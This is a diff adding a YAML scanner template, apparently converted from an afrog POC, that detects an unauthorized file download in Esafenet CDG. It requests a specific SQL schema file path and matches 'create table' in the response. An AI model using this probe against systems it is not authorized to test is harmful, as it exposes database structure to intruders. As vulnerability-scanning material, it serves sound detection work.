@@ -1,0 +1,27 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - varchar
+          - create table
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql'
+id: esafenet-sql-mysql-fileread
+info:
+  author: hbdxmz
+  description: ""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: medium
+  name: 亿赛通未授权文件下载
+  severity: medium
+  tags: esafenet,fileread,argus-import
